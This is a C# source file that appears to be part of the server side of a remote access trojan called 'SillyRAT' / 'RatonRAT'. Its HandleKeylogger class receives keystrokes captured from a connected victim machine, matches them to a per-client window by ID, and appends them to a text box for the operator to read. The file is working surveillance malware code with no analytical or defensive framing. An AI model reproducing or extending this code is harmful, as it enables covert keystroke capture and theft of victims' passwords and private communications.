using System;
using System.Drawing;
using System.Windows.Forms;
using SillyRAT;
using Server.Connection;
using RatonRAT.ClientForms;
using Stuff;

namespace Server.Handlers
{
    internal class HandleKeylogger
    {
        public HandleKeylogger(SillyClient SillyClient, Unpack msgUnpack)
        {
            string formName = "Keylogger | Client ID: ";
            FormKeylogger keyloggerForm = (FormKeylogger)Application.OpenForms[formName + msgUnpack.GetAsString("UID")];

            if (keyloggerForm != null)
            {
                if (keyloggerForm.SillyClient == null)
                {
                    keyloggerForm.SillyClient = SillyClient;
                }

                keyloggerForm.Invoke(new MethodInvoker(() =>
                {
                    string keys = msgUnpack.GetAsString("Keys");
                    keyloggerForm.textBox1.Text = keyloggerForm.textBox1.Text + keys;
                }));
            }
        }
    }
}
